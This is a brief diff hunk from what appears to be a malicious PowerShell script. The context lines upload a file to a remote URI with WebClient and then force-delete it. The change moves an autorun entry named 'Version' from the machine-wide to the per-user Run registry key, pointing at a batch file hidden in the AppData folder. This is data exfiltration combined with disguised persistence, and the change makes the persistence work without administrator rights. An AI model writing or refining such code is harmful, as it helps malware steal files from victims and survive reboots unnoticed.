@@ -21,7 +21,7 @@ $webclient.UploadFile($uri, $filename)
 
 remove-item $filename -force
 
-$RegistryPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+$RegistryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $Name = 'Version'
 $paFile = $env:appdata + '\ppb.bat'
 
